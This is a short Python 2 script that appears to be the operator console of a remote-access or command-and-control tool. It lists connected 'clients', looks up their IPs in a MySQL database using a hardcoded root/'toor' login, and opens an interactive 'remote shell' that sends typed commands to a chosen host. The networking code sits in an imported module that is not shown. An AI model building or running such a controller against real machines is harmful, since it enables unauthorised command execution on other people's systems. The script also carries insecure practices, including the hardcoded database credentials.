import functions
import MySQLdb

def menu():
	print("[1] List connected clients")
	print("[2] List all clients")
	print("[3] Interact with a client")
	print("[4] Exit")

def id_to_ip(client_id):
# Translate an unique ID into the corresponding IP
        db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
	cursor.execute( """select lip from clients.clients where id = %s""",([client_id]))
	rows = cursor.fetchall()
	ip = str(rows)[:-5]
	ip = ip.replace("(('","")
	db.close
	return ip

def interact_sub_menu():
	print(" ")
	client_id = raw_input("ID of the remote client to interact with : ")
	ip = id_to_ip(client_id)

	Exit = False
	print("Type 'Exit' to quit the remote shell.")
	while Exit == False:
		command_sub = raw_input(ip + " shell >> ")
		command_send = command_sub
		try:
			functions.send_cmd(command_send,ip)
		except:
			print("Debug me")

		if command_sub == "Exit":
			Exit = True
		else:
			pass

loop =True

while loop:
	menu()
	choice = input("Choose option (1 to 4) : ")

	if choice == 1:
		functions.who_is_alive_connected()
	elif choice == 2:
                functions.who_is_alive()
	elif choice == 3:
                interact_sub_menu()
	elif choice == 4:
                loop = False
	else:
		print("Wrong option selection.")
